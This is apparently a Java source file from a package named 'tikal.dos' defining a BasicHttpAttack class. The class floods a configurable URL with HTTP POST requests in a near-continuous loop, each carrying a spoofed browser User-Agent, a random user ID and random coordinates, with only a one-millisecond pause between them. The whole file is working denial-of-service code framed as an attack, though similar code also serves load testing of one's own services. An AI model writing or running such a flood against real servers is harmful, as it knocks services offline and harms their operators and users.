/**
 * 
 */
package tikal.dos;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URISyntaxException;
import java.net.URL;
import java.util.Random;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.HttpClientBuilder;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;


/**
 * @author assafgannon
 *
 */
public class BasicHttpAttack implements Attack {
	
	private Logger log = LoggerFactory.getLogger(BasicHttpAttack.class);

	private static final String CONTENT_TYPE = "application/json";

	private final String USER_AGENT = "Mozilla/5.0";
	
	URL url;
	volatile boolean running = false;
	
	private final HttpClientBuilder httpClientBuilder;
	
	public BasicHttpAttack() {
		httpClientBuilder = HttpClientBuilder.create();
	}
	
	@Override
	public void run() {
		Random random = new Random();
		running = true;
		
		HttpClient httpClient = httpClientBuilder.build();
		
		while(running){
			//HttpURLConnection con = null;
			try {
				HttpPost post = new HttpPost(url.toURI());
				post.addHeader("User-Agent", USER_AGENT);
				post.addHeader("Content-Type", CONTENT_TYPE);
				post.addHeader("Accept-Language", "en-US,en;q=0.5");
				
				//con = (HttpURLConnection) url.openConnection();
 
				//add reuqest header
				//con.setRequestMethod("POST");
				//con.setRequestProperty("User-Agent", USER_AGENT);
				//con.setRequestProperty("Content-Type", CONTENT_TYPE);
				//con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
 
				String userId = java.util.UUID.randomUUID().toString();
				double latitude = 32d+random.nextDouble();
				double longitude = 34+random.nextDouble();
				String urlParameters = "{\"userId\":\""+userId+"\",\"latitude\":"+latitude+",\"longitude\":"+longitude+"}";
 
				ByteArrayEntity entity = new ByteArrayEntity(urlParameters.getBytes());
				post.setEntity(entity);
				
				HttpResponse response = httpClient.execute(post);
				log.info(new BasicResponseHandler().handleResponse(response));
				
				// Send post request
				/*con.setDoOutput(true);
				DataOutputStream wr = new DataOutputStream(con.getOutputStream());
				wr.writeBytes(urlParameters);
				wr.flush();
				wr.close();*/
				
				/*int responseCode = con.getResponseCode();
				System.out.println("\nSending 'POST' request to URL : " + url);
				System.out.println("Post parameters : " + urlParameters);
				System.out.println("Response Code : " + responseCode);*/
		 
				//Sleep to prevent CPU hogging
				try {
					Thread.sleep(1);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				//gracefully shutdown
				running = false;
			} catch (URISyntaxException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}finally {
				//con.disconnect();
			}
	 
		}
	}

	@Override
	public void setUrl(String url) throws Exception {
		this.url = new URL(url);
		System.out.println(url);
	}
	
	@Override
	public void stop(){
		running = false;
	}

}
